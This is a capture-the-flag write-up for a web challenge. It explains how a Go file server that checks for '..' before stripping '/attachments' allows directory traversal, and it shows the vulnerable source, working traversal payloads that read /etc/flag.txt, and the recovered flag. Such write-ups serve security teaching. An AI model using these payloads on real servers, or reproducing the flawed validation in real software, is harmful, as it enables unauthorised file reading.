---
layout: writeup
title: secure email attachments
tags: WebX
---

## Description

Dear Raahguu,

During the email apocalypse, IT admins tried to prevent the DOS of all systems by disallowing attachments to emails. To get around this, users would create their own file storage web servers for hosting their attachments, which also got DOSed because everyone was mass spamming the links in emails...

Can you read /etc/flag.txt from the filesystem?

Regards,
MC Fat Monke


The challenge then also provided the source code for the email attachments file system


## Solution

This challenge was coded in `GO`, now luckily (as I don't know GO) we don't need to get too deep into semantics of the language.

Some setup. The files provided showed a dockerfile:

```bash
FROM golang:1.24.4-bookworm AS base

COPY app /app
WORKDIR /app
RUN go build .

FROM golang:1.24.4-bookworm
COPY --from=base /app/secure-email-attachments /app/secure-email-attachments
COPY --from=base /app/attachments /app/attachments
COPY --from=base /app/flag.txt /etc/flag.txt

USER www-data
WORKDIR /app
ENTRYPOINT [ "/app/secure-email-attachments" ]
```

This file lets us know the exact directory and paths of everything, particularly of where the code is being executed and where the flag is. Meaning that we know that in order to get the flag we need to read the data in the `../../etc/flag.txt` file.


Next the actual program we need to exploit:

```go
package main

import (
	"net/http"
	"path/filepath"
	"strings"

	"github.com/gin-gonic/gin"
)

func main() {
	r := gin.Default()

	r.GET("/*path", func(c *gin.Context) {
		p := c.Param("path")
		if strings.Contains(p, "..") {
			c.AbortWithStatus(400)
			c.String(400, "URL path cannot contain \"..\"")
			return
		}
		// Some people were confused and were putting /attachments in the URLs. This fixes that
		cleanPath := filepath.Join("./attachments", filepath.Clean(strings.ReplaceAll(p, "/attachments", "")))
		http.ServeFile(c.Writer, c.Request, cleanPath)
	})

	r.Run("0.0.0.0:1337")
}
```

This file has a bunch of go stuff I don't understand, but the real guts (the `main` function) seems pretty simple.

1. It initialises as webserver `r := gin.Default()` (this is an assumption, don't take my word for it, thats just the only thing I can see that code doing)
2. If the user sends a GET request to a certain path, then set that path value to `p`
3. If `p` has any instances of  `..` in it, deny their request
4. Remove any instances of the string `/attachments` in the path string `p`
5. Return to the user the data in the file at the path `p` that they inputted
6. Run the server

Now this chain of logic has a semi common exploit in it. Namley a time-of-check-to-time-of-use (TOCTOU) vulnerability. This is a vulnerability where the program checks a certain state, and then based on that check preforms an action. But, the state might end up changing between that check and the action.

In this case, the string `p` is checked if it containes any instances of `..` (step 3). Then, the program modifies the value of `p` by removing any instances of `/attachments` (step 4), before then preforming the action of returning to the user the file at path location `p`.

This can be exploited by creating a string that at first passes that check of noting having any `..`, and then have it be modified in such a way that it now has `..` and as such can be used for file traversal. In this case the string `./attachments.` passes the check, then `/attachments` is removed so it becomes `..`

As such we can do directory traversal and can merely grab the flag with the following payload:

What we want:

```text
../../etc/flag.txt
```

Transformation proccess:

```text
.. -> ./attachments.
```

Therefore the payload should be:

```text
./attachments././attachments./etc/flag.txt
```

This is what want the value of `p` to be, but the problem is due to URL normalisation most browsers (including curl) a `/./` at any point gets simplified to `/`

As such the payload needs to get a bit more convoluted to remove instances of `/./`

So the new payload needs to be

```text
/attachments./attachments.//attachments./attachments./etc/flag.txt
```

Note: when using these payloads, they look like this:

```text
**********.com/attachments./attachments./attachments./etc/flag.txt
```

This then returns the flag: `DUCTF{w00000000T!!1one!?!ONE_i_ThORt_tH3_p4RtH_w4R_cL34N!!1??}`
